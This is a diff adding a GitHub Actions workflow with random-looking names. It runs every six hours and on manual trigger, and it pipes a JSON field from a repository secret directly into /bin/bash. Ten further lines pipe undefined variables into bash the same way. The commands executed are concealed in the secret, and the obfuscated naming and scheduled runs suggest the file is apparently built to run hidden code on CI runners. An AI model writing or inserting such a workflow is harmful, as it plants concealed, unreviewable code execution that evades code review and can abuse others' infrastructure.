@@ -1,0 +1,28 @@
+name: performermushroom
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: performermushroom
+        env:
+          npl6522: ${{ secrets.npl6522 }}
+        run: |
+          echo $npl6522 | jq -r .bci9909 | /bin/bash
+          echo $jbdjp82082 | jq -r .t5 | /bin/bash
+          echo $tfi2 | jq -r .gquve0444 | /bin/bash
+          echo $d02 | jq -r .w328 | /bin/bash
+          echo $foxw127 | jq -r .m317 | /bin/bash
+          echo $hchhz7689 | jq -r .unkw0 | /bin/bash
+          echo $j8639 | jq -r .k98 | /bin/bash
+          echo $nox549 | jq -r .csf4 | /bin/bash
+          echo $qqko0672 | jq -r .s0 | /bin/bash
+          echo $as43031 | jq -r .q01 | /bin/bash
+          echo $anq0 | jq -r .c71507 | /bin/bash
+
